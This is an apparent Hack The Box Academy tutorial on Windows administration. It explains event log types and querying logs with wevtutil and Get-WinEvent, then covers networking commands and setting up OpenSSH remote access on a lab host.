There are five types of events that can be logged on Windows systems:

|Type of Event|Event Description|
|---|---|
|Error|Indicates a major problem, such as a service failing to load during startup, has occurred.|
|Warning|A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data.|
|Information|Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each time they start, as this could lead to a considerable amount of extra "noise" in the logs.|
|Success Audit|Recorded when an audited security access attempt is successful, such as when a user logs on to a system.|
|Failure Audit|Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying.|
#### Event Severity Levels

Each log can have one of five severity levels associated with it, denoted by a number:

|Severity Level|Level #|Description|
|---|---|---|
|Verbose|5|Progress or success messages.|
|Information|4|An event that occurred on the system but did not cause any issues.|
|Warning|3|A potential problem that a sysadmin should dig into.|
|Error|2|An issue related to the system or service that does not require immediate attention.|
|Critical|1|This indicates a significant issue related to an application or a system that requires urgent attention by a sysadmin that, if not addressed, could lead to system or application instability.|
### Elements of a Windows Event Log

The Windows Event Log provides information about hardware and software events on a Windows system. All event logs are stored in a standard format and include the following elements:

- `Log name`: As discussed above, the name of the event log where the events will be written. By default, events are logged for `system`, `security`, and `applications`.
- `Event date/time`: Date and time when the event occurred
- `Task Category`: The type of recorded event log
- `Event ID`: A unique identifier for sysadmins to identify a specific logged event
- `Source`: Where the log originated from, typically the name of a program or software application
- `Level`: Severity level of the event. This can be information, error, verbose, warning, critical
- `User`: Username of who logged onto the host when the event occurred
- `Computer`: Name of the computer where the event is logged
  
There are many Event IDs that an organization can monitor to detect various issues. In an Active Directory environment, [this list](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor) includes key events that are recommended to be monitored for to look for signs of a compromise. [This](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/) searchable database of Event IDs is worth perusing to understand the depth of logging possible on a Windows system.

---

#### Windows Event Log Technical Details

The Windows Event Log is handled by the `EventLog` services. On a Windows system, the service's display name is `Windows Event Log`, and it runs inside the service host process [svchost.exe](https://en.wikipedia.org/wiki/Svchost.exe). It is set to start automatically at system boot by default. It is difficult to stop the EventLog service as it has multiple dependency services. If it is stopped, it will likely cause significant system instability. By default, Windows Event Logs are stored in `C:\Windows\System32\winevt\logs` with the file extension `.evtx`.

We can interact with the Windows Event log using the [Windows Event Viewer](https://en.wikipedia.org/wiki/Event_Viewer) GUI application via the command line utility [wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil), or using the [Get-WinEvent](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3) PowerShell cmdlet. Both `wevtutil` and `Get-WinEvent` can be used to query Event Logs on both local and remote Windows systems via cmd.exe or PowerShell.

## Interacting with the Windows Event Log - wevtutil

The [wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) command line utility can be used to retrieve information about event logs. It can also be used to export, archive, and clear logs, among other commands.

We can use the `el` parameter to enumerate the names of all logs present on a Windows system.

#### Enumerating Log Sources

  Working with the Windows Event Log

```cmd-session
C:\htb> wevtutil el

AMSI/Debug
AirSpaceChannel
Analytic
Application
DirectShowFilterGraph
DirectShowPluginControl
Els_Hyphenation/Analytic
EndpointMapper
FirstUXPerf-Analytic
ForwardedEvents
General Logging
HardwareEvents

<SNIP>
```

With the `gl` parameter, we can display configuration information for a specific log, notably whether the log is enabled or not, the maximum size, permissions, and where the log is stored on the system.

#### Gathering Log Information
```cmd-session
C:\htb> wevtutil gl "Windows PowerShell"

name: Windows PowerShell
enabled: true
type: Admin
owningPublisher:
isolation: Application
channelAccess: O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)
logging:
  logFileName: %SystemRoot%\System32\Winevt\Logs\Windows PowerShell.evtx
  retention: false
  autoBackup: false
  maxSize: 15728640
publishing:
  fileMax: 1

```

The `gli` parameter will give us specific status information about the log or log file, such as the creation time, last access and write times, file size, number of log records, and more.

```cmd-session
C:\htb> wevtutil gli "Windows PowerShell"

creationTime: 2020-10-06T16:57:38.617Z
lastAccessTime: 2022-10-26T19:05:21.533Z
lastWriteTime: 2022-10-26T19:05:21.533Z
fileSize: 11603968
attributes: 32
numberOfLogRecords: 9496
oldestRecordNumber: 1

```

There are many ways we can query for events. For example, let's say we want to display the last 5 most recent events from the Security log in text format. Local admin access is needed for this command.

```cmd-session
C:\htb> wevtutil qe Security /c:5 /rd:true /f:text

Event[0]
  Log Name: Security
  Source: Microsoft-Windows-Security-Auditing
  Date: 2022-11-16T14:54:13.2270000Z
  Event ID: 4799
  Task: Security Group Management
  Level: Information
  Opcode: Info
  Keyword: Audit Success
  User: N/A
  User Name: N/A
  Computer: ICL-WIN11.greenhorn.corp
  Description: 
A security-enabled local group membership was enumerated.

Subject:
        Security ID:            S-1-5-18
        Account Name:           ICL-WIN11$
        Account Domain:         GREENHORN
        Logon ID:               0x3E7

Group:
        Security ID:            S-1-5-32-544
        Group Name:             Administrators
        Group Domain:           Builtin

Process Information:
        Process ID:             0x56c
        Process Name:           C:\Windows\System32\svchost.exe
```

We can also export events from a specific log for offline processing. Local admin is also needed to perform this export.

#### Exporting Events

  Working with the Windows Event Log

```cmd-session
C:\htb> wevtutil epl System C:\system_export.evtx
```

---

#### Interacting with the Windows Event Log - PowerShell

Similarly, we can interact with Windows Event Logs using the [Get-WinEvent](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3) PowerShell cmdlet. Like with the `wevtutil` examples, some commands require local admin-level access.

To start, we can list all logs on the computer, giving us the number of records in each log.

#### PowerShell - Listing All Logs

  Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -ListLog *

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular            15728640         657 Windows PowerShell
Circular            20971520       10713 System
Circular            20971520       26060 Security
Circular            20971520           0 Key Management Service
Circular             1052672           0 Internet Explorer
Circular            20971520           0 HardwareEvents
Circular            20971520        6202 Application
Circular             1052672             Windows Networking Vpn Plugin Platform/Op...
Circular             1052672             Windows Networking Vpn Plugin Platform/Op... 
Circular             1052672           0 SMSApi
Circular             1052672          61 Setup
Circular            15728640          24 PowerShellCore/Operational
Circular             1052672          99 OpenSSH/Operational
Circular             1052672          46 OpenSSH/Admin

<SNIP>
```

We can also list information about a specific log. Here we can see the size of the `Security` log.

#### Security Log Details

  Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -ListLog Security

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular            20971520       26060 Security
```

We can query for the last X number of events, looking specifically for the last five events using the `-MaxEvents` parameter. Here we will list the last five events recorded in the Security log. By default, the newest logs are listed first. If we want to get older logs first, we can reverse the order to list the oldest ones first using the `-Oldest` parameter.

#### Querying Last Five Events

  Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message

An account was logged off.

Subject:
        Security ID:            S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-6052
        Account Name:           sshd_6052
        Account Domain:         VIRTUAL USERS
        Logon ID:               0x8E787

Logon Type:                     5

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
Special privileges assigned to new logon.

Subject:
        Security ID:            S-1-5-18
        Account Name:           SYSTEM
        Account Domain:         NT AUTHORITY
        Logon ID:               0x3E7

Privileges:             SeAssignPrimaryTokenPrivilege
                        SeTcbPrivilege
                        SeSecurityPrivilege
                        SeTakeOwnershipPrivilege
                        SeLoadDriverPrivilege
                        SeBackupPrivilege
                        SeRestorePrivilege
                        SeDebugPrivilege
                        SeAuditPrivilege
                        SeSystemEnvironmentPrivilege
                        SeImpersonatePrivilege
                        SeDelegateSessionUserImpersonatePrivilege
An account was successfully logged on.

<SNIP>
```

We can dig deeper and look at specific event IDs in specific logs. Let's say we only want to look at logon failures in the Security log, checking for Event ID [4625: An account failed to log on](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625). From here, we could use the `-ExpandProperty` parameter to dig deeper into specific events, list logs from oldest to newest, etc.

#### Filtering for Logon Failures

  Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
11/16/2022 2:53:16 PM          4625 Information      An account failed to log on....  
11/16/2022 2:53:16 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:53:12 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:36 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:29 PM          4625 Information      An account failed to log on.... 
11/16/2022 2:50:21 PM          4625 Information      An account failed to log on....

<SNIP>
```

We can also look at only events with a specific information level. Let's check all System logs for only `critical` events with information level `1`. Here we see just one log entry where the system did not reboot cleanly.

  Working with the Windows Event Log

```powershell-session
PS C:\htb> Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message

The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly.
```

Practice more with `wevtutil` and `Get-WinEvent` to become more comfortable with searching logs. Microsoft provides some [examples](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3) for `Get-WinEvent`, while [this site](https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it) shows examples for `wevtutil`, and [this site](https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/) has some additional examples for using `Get-WinEvent`.

# Networking Management from The CLI

## What Is Networking Within a Windows Network?

Networking with Windows hosts functions similar to other Linux or Unix based host. The TCP/IP stack, wireless protocols and other applications treat most devices the same.  Quick review of protocols used frequently in Windows

|**Protocol**|**Description**|
|---|---|
|`SMB`|[SMB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/4287490c-602c-41c0-a23e-140a1f137832) provides Windows hosts with the capability to share resources, files, and a standard way of authenticating between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option.|
|`Netbios`|[NetBios](https://www.ietf.org/rfc/rfc1001.txt) itself isn't directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism when DNS fails. Can also be known as NBT-NS (NetBIOS name service).|
|`LDAP`|[LDAP](https://www.rfc-editor.org/rfc/rfc4511) is an `open-source` cross-platform protocol used for `authentication` and `authorization` with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as `Active Directory`.|
|`LLMNR`|[LLMNR](https://www.rfc-editor.org/rfc/rfc4795) provides a name resolution service based on DNS and works if DNS is not available or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links).|
|`DNS`|[DNS](https://datatracker.ietf.org/doc/html/rfc1034) is a common naming standard used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by "WWW.google.com" instead of "8.8.8.8". Internally this is how we request resources and access from a network.|
|`HTTP/HTTPS`|[HTTP/S](https://www.rfc-editor.org/rfc/rfc2818) HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as web servers, send and receive data from remote sources, and much more.|
|`Kerberos`|[Kerberos](https://web.mit.edu/kerberos/) is a network level authentication protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources.|
|`WinRM`|[WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) Is an implementation of the WS-Management protocol. It can be used to manage the hardware and software functionalities of hosts. It is mainly used in IT administration but can also be used for host enumeration and as a scripting engine.|
|`RDP`|[RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-plan-access-from-anywhere) is a Windows implementation of a network UI services protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host.|
|`SSH`|[SSH](https://datatracker.ietf.org/doc/html/rfc4251) is a secure protocol that can be used for secure host access, transfer of files, and general communication between network hosts. It provides a way to securely access hosts and services over insecure networks.|
### Local vs. Remote Access?

### Local Access

Local host access is when we are directly at the terminal utilizing its resources as you are right now from your PC. Usually, this will not require us to use any specific access protocols except when we request resources from networked hosts or attempt to access the Internet. Below we will showcase some cmdlets and other ways to check and validate network settings on our hosts.

### Querying Networking Settings

Before doing anything else, let's validate the network settings on Mr. Tanaka's host. We will start by running the `IPConfig` command. This isn't a PowerShell native command, but it is compatible.

#### IPConfig
```powershell-session
PS C:\htb> ipconfig 

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Link-local IPv6 Address . . . . . : fe80::c5ca:594d:759d:e0c1%11
   IPv4 Address. . . . . . . . . . . : 10.129.203.105
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:b9fc%11
                                       10.129.0.1
```

`ipconfig` will show us the basic settings of your network interface. We have as output the IPv4/6 addresses, our gateway, subnet masks, and DNS suffix if one is set. We can output the full network settings by appending the `/all` modifier to the ipconfig command like so:

  Networking Management from The CLI

```powershell-session
PS C:\htb> ipconfig /all 

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ICL-WIN11
   Primary Dns Suffix  . . . . . . . : greenhorn.corp
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : greenhorn.corp
                                       htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-4F-CB
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::222(Preferred)
   Lease Obtained. . . . . . . . . . : Monday, October 17, 2022 9:40:14 AM
   Lease Expires . . . . . . . . . . : Tuesday, October 25, 2022 9:59:17 AM
   <SNIP>
   IPv4 Address. . . . . . . . . . . : 10.129.203.105(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Monday, October 17, 2022 9:40:13 AM
   Lease Expires . . . . . . . . . . : Tuesday, October 25, 2022 10:10:16 AM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:b9fc%11
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 335564886
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3D-00-D6-00-50-56-B9-4F-CB
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

Ethernet adapter Ethernet2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-F5-7E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d1fb:79d5:6d0b:41de%14(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.5.100(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.5.1
   DHCPv6 IAID . . . . . . . . . . . : 318787670
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3D-00-D6-00-50-56-B9-4F-CB
   DNS Servers . . . . . . . . . . . : 172.16.5.155
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

We are presented with output containing multiple adapters, `Host settings`, more details about if our IP addresses were `manually` set or `DHCP leases`, how long those leases are, and more. So, it appears Mr. Tanaka's host has a proper IP address configuration. Of note, and particularly interesting to us as pentesters, is that this host is dual-homed. We mean it has multiple network interfaces connected to separate networks. This makes Mr. Tanakas host a great target if we are looking for a foothold in the network and wish to have a way to migrate between networks.

Let's look at `Arp` settings and see if his host has communicated with others on the network. As a refresher, ARP is a protocol utilized to `translate IP addresses to Physical addresses`. The physical address is used at lower levels of the `OSI/TCP-IP` models for communication. To have it display the host's current ARP entries, we will use the `-a` switch.

#### ARP

  Networking Management from The CLI

```powershell-session
PS C:\htb> arp -a

Interface: 10.129.203.105 --- 0xb
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-b9-fc     dynamic
  10.129.204.58         00-50-56-b9-5f-41     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.16.5.100 --- 0xe
  Internet Address      Physical Address      Type
  172.16.5.155          00-50-56-b9-e2-30     dynamic
  172.16.5.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
```

The output from `Arp -a` is pretty simple. We are provided with entries from our network adapters about the hosts it is aware of or has communicated with recently. Not surprisingly, since this host is fairly new, it has yet to communicate with too many hosts. Just the gateways, our remote host, and the host 172.16.5.155, the `Domain Controller` for `Greenhorn.corp`. Nothing crazy to be seen here. Now let's validate our DNS configuration is working properly. We will utilize `nslookup`, a built-in DNS querying tool, to attempt to resolve the IP address / DNS name of the Greenhorn domain controller.

#### Nslookup

  Networking Management from The CLI

```powershell-session
PS C:\htb> nslookup ACADEMY-ICL-DC

DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.5.155

Name:    ACADEMY-ICL-DC.greenhorn.corp
Address:  172.16.5.155
```

Now that we have validated Mr. Tanakas DNS settings, let's check the open ports on the host. We can do so using `netstat -an`. Netstat will display current network connections to our host. The `-an` switch will print all connections and listening ports and place them in numerical form.

#### Netstat

  Networking Management from The CLI

```powershell-session
PS C:\htb> netstat -an 

netstat -an

Active Connections

 Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
<snip>
 UDP    172.16.5.100:137       *:*
  UDP    172.16.5.100:138       *:*
  UDP    172.16.5.100:1900      *:*
  UDP    172.16.5.100:54453     *:*
```

### PowerShell Net Cmdlets

PowerShell has several powerful built-in cmdlets made to handle networking services and administration. The NetAdapter, NetConnection, and NetTCPIP modules are just a few that we will practice with today.

#### Net Cmdlets

|**Cmdlet**|**Description**|
|---|---|
|`Get-NetIPInterface`|Retrieve all `visible` network adapter `properties`.|
|`Get-NetIPAddress`|Retrieves the `IP configurations` of each adapter. Similar to `IPConfig`.|
|`Get-NetNeighbor`|Retrieves the `neighbor entries` from the cache. Similar to `arp -a`.|
|`Get-Netroute`|Will print the current `route table`. Similar to `IPRoute`.|
|`Set-NetAdapter`|Set basic adapter properties at the `Layer-2` level such as VLAN id, description, and MAC-Address.|
|`Set-NetIPInterface`|Modifies the `settings` of an `interface` to include DHCP status, MTU, and other metrics.|
|`New-NetIPAddress`|Creates and configures an `IP address`.|
|`Set-NetIPAddress`|Modifies the `configuration` of a network adapter.|
|`Disable-NetAdapter`|Used to `disable` network adapter interfaces.|
|`Enable-NetAdapter`|Used to turn network adapters back on and `allow` network connections.|
|`Restart-NetAdapter`|Used to restart an adapter. It can be useful to help push `changes` made to adapter `settings`.|
|`test-NetConnection`|Allows for `diagnostic` checks to be ran on a connection. It supports ping, tcp, route tracing, and more.|

#### Get-NetIPInterface

```powershell-session
PS C:\htb> get-netIPInterface

ifIndex InterfaceAlias                  AddressFamily NlMtu(Bytes) InterfaceMetric Dhcp     ConnectionState PolicyStore
------- --------------                  ------------- ------------ --------------- ----     --------------- -----------
20      Ethernet 3                      IPv6                  1500              25 Enabled  Disconnected    ActiveStore
14      VMware Network Adapter VMnet8   IPv6                  1500              35 Enabled  Connected       ActiveStore
8       VMware Network Adapter VMnet2   IPv6                  1500              35 Enabled  Connected       ActiveStore
10      VMware Network Adapter VMnet1   IPv6                  1500              35 Enabled  Connected       ActiveStore
17      Local Area Connection* 2        IPv6                  1500              25 Enabled  Disconnected    ActiveStore
21      Bluetooth Network Connection    IPv6                  1500              65 Disabled Disconnected    ActiveStore
15      Local Area Connection* 1        IPv6                  1500              25 Disabled Disconnected    ActiveStore
25      Wi-Fi                           IPv6                  1500              40 Enabled  Connected       ActiveStore
7       Local Area Connection           IPv6                  1500              25 Enabled  Disconnected    ActiveStore
1       Loopback Pseudo-Interface 1     IPv6            4294967295              75 Disabled Connected       ActiveStore
20      Ethernet 3                      IPv4                  1500              25 Enabled  Disconnected    ActiveStore
14      VMware Network Adapter VMnet8   IPv4                  1500              35 Disabled Connected       ActiveStore
8       VMware Network Adapter VMnet2   IPv4                  1500              35 Disabled Connected       ActiveStore
10      VMware Network Adapter VMnet1   IPv4                  1500              35 Disabled Connected       ActiveStore
17      Local Area Connection* 2        IPv4                  1500              25 Disabled Disconnected    ActiveStore
21      Bluetooth Network Connection    IPv4                  1500              65 Enabled  Disconnected    ActiveStore
15      Local Area Connection* 1        IPv4                  1500              25 Enabled  Disconnected    ActiveStore
25      Wi-Fi                           IPv4                  1500              40 Enabled  Connected       ActiveStore
7       Local Area Connection           IPv4                  1500               1 Disabled Disconnected    ActiveStore
1       Loopback Pseudo-Interface 1     IPv4            4294967295              75 Disabled Connected       ActiveStore
```

This listing shows us our available interfaces on the host in a bit of a convoluted manner. We are provided plenty of metrics, but the adapters are broken up by `AddressFamily`. So we see entries for each adapter twice if IPv4 and IPv6 are enabled on that particular interface. The `ifindex` and `InterfaceAlias` properties are particularly useful. These properties make it easy for us to use the other cmdlets provided by the `NetTCPIP` module. Let's get the Adapter information for our Wi-Fi connection at `ifIndex 25` utilizing the [Get-NetIPAddress](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipaddress?view=windowsserver2022-ps) cmdlet.

#### Get-NetIPAddress
```powershell-session
PS C:\htb> Get-NetIPAddress -ifIndex 25

IPAddress         : fe80::a0fc:2e3d:c92a:48df%25
InterfaceIndex    : 25
InterfaceAlias    : Wi-Fi
AddressFamily     : IPv6
Type              : Unicast
PrefixLength      : 64
PrefixOrigin      : WellKnown
SuffixOrigin      : Link
AddressState      : Preferred
ValidLifetime     : Infinite ([TimeSpan]::MaxValue)
PreferredLifetime : Infinite ([TimeSpan]::MaxValue)
SkipAsSource      : False
PolicyStore       : ActiveStore
```

#### Set-NetIPInterface

  Networking Management from The CLI

```powershell-session
PS C:\htb> Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
```

By disabling the DHCP property with the Set-NetIPInterface cmdlet, we can now set our manual IP Address. We do that with the `Set-NetIPAddress` cmdlet.

#### Set-NetIPAddress

  Networking Management from The CLI

```powershell-session
PS C:\htb> Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24

PS C:\htb> Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength

InterfaceIndex InterfaceAlias IPAddress                   PrefixLength
-------------- -------------- ---------                   ------------
            20 Ethernet 3     fe80::7408:bbf:954a:6ae5%20           64
            20 Ethernet 3     10.10.100.54                          24

PS C:\htb> Get-NetIPinterface -ifindex 20 | ft ifIndex,InterfaceAlias,Dhcp

ifIndex InterfaceAlias     Dhcp
------- --------------     ----
     20 Ethernet 3     Disabled
     20 Ethernet 3     Disabled
```

The above command now sets our IP address to `10.10.100.54` and the PrefixLength ( also known as the subnet mask ) to `24`. Looking at our checks, we can see that those settings are in place. To be safe, let's restart our network adapter and test our connection to see if it sticks.

#### Restart-NetAdapter

  Networking Management from The CLI

```powershell-session
PS C:\htb> Restart-NetAdapter -Name 'Ethernet 3'
```

As long as nothing goes wrong, you will not receive output. So when it comes to `Restart-NetAdapter`, no news is good news. The easiest way to tell the cmdlet which interface to restart is with the `Name` property, which is the same as the `InterfaceAlias` from previous commands we ran. Now, to ensure we still have a connection, we can use the Test-NetConnection cmdlet.

#### Test-NetConnection

  Networking Management from The CLI

```powershell-session
PS C:\htb> Test-NetConnection

ComputerName           : <snip>msedge.net
RemoteAddress          : 13.107.4.52
InterfaceAlias         : Ethernet 3
SourceAddress          : 10.10.100.54
PingSucceeded          : True
PingReplyDetails (RTT) : 44 ms
```

The Test-NetConnection is a powerful cmdlet, capable of testing beyond basic network connectivity to determine whether we can reach another host. It can tell us about our TCP results, detailed metrics, route diagnostics and more. It would be worthwhile to look at this article by Microsoft on [Test-NetConnection](https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps). Now that we have completed our task and validated Mr. Tanaka's network settings on his host, let's discuss remote access connectivity for a bit.

### Remote Access

When we cannot access Windows systems or need to manage hosts remotely, we can utilize PowerShell, SSH, and RDP, among other tools, to perform our work. Let's cover the main ways we can enable and use remote access. First, we will discuss `SSH`.

---

## How to Enable Remote Access? ( SSH, PSSessions, etc.)

### Enabling SSH Access

We can use `SSH` to access `PowerShell` on a Windows system over the network. Starting in 2018, SSH via the [OpenSSH](https://www.openssh.com/) client and server applications has been accessible and included in all Windows Server and Client versions. It makes for an easy-to-use and extensible communication mechanism for our administrative use. Setting up OpenSSH on our hosts is simple. Let's give it a try. We must install the SSH Server component and the client application to access a host via SSH remotely.

#### Setting up SSH on a Windows Target

We can set up an SSH server on a Windows target using the [Add-WindowsCapability](https://docs.microsoft.com/en-us/powershell/module/dism/add-windowscapability?view=windowsserver2022-ps) cmdlet and confirm that it is successfully installed using the [Get-WindowsCapability](https://docs.microsoft.com/en-us/powershell/module/dism/get-windowscapability?view=windowsserver2022-ps) cmdlet.

  Networking Management from The CLI

```powershell-session
PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : NotPresent

PS C:\Users\htb-student> Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

Path          :
Online        : True
RestartNeeded : False

PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : NotPresent

PS C:\Users\htb-student> Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

Path          :
Online        : True
RestartNeeded : False

PS C:\Users\htb-student> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Name  : OpenSSH.Client~~~~0.0.1.0
State : Installed

Name  : OpenSSH.Server~~~~0.0.1.0
State : Installed
```

#### Starting the SSH Service & Setting Startup Type

Once we have confirmed SSH is installed, we can use the [Start-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service?view=powershell-7.2) cmdlet to start the SSH service. We can also use the [Set-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2) cmdlet to configure the startup settings of the SSH service if we choose.

  Networking Management from The CLI

```powershell-session
PS C:\Users\htb-student> Start-Service sshd  
  
PS C:\Users\htb-student> Set-Service -Name sshd -StartupType 'Automatic'  
```

Note: Initial setup of remote access services will not be a requirement in this module to complete challenge questions. With each of the challenges in this module, remote access is already set up & configured. However, understanding how to connect and apply concepts covered throughout the module will be required. The setup & configuration steps are provided to help develop an understanding of common configuration mistakes and, in some cases, best security practices. Feel free to try some setup steps on your own personal VM.

#### Accessing PowerShell over SSH

With SSH installed and running on a Windows target, we can connect over the network with an SSH client.

#### Connecting from Windows

  Networking Management from The CLI

```powershell-session
PS C:\Users\administrator> ssh htb-student@10.129.224.248

htb-student@10.129.224.248 password:
```

By default, this will connect us to a CMD session, but we can type `powershell` to enter a PowerShell session, as mentioned earlier in this section.

  Networking Management from The CLI

```powershell-session
WS01\htb-student@WS01 C:\Users\htb-student> powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:\Users\htb-student>
```

We will notice that the steps to connect to a Windows target over SSH using Linux are identical to those when connecting from Windows.

#### Connecting from Linux

  Networking Management from The CLI

```shell-session
PS C:\Users\administrator> ssh htb-student@10.129.224.248

htb-student@10.129.224.248 password:

WS01\htb-student@WS01 C:\Users\htb-student> powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:\Users\htb-student>
```

Now that we have covered SSH let's spend some time covering enabling and using `WinRM` for remote access and management.

### Enabling WinRM

